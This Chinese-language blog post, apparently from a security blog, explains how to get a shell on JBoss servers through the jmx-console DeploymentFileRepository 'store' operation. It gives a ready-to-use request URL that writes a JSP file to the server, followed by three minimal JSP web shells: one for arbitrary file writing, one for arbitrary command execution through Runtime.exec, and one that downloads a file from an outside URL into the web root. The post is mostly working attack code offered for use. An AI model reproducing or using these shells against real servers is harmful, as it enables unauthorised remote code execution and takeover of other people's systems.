---
title: "JBoss 本地 Getshell"
date: 2018-08-13T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['jboss']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

Jboss 远程部署 getshell 有时候会爆 `org.jboss.web.tomcat.filters.ReplyHeaderFilter.doFilter` 的错误.

本地 getshell 不需要远程主机, 缺点是只能写特别小的 jsp 马, 太大可能会 400 或者 no response found.

<!--more-->

```
/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=upload5warn.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=CONTENT&argType=boolean&arg4=True
```

把 CONTENT 替换成要写入的内容, 注意先要进行一次 url 编码.

给出几个特别小的马.

写 shell, 传参 `?f=test.txt&t=helloworldT`

```
<% if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>
```

执行命令, 传参 `?i=whoami`

```
<%if(request.getParameter("i")!=null){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>
```

下载文件, 传参 `?f=test.txt&u=http://example.com/test.txt`

```
<% if(request.getParameter("u")!=null){java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();byte[] b = new byte[1024];java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();int a = -1;while ((a = in.read(b)) != -1) {baos.write(b, 0, a);}new java.io.FileOutputStream(application.getRealPath("/")+"/"+ request.getParameter("f")).write(baos.toByteArray());}%>
```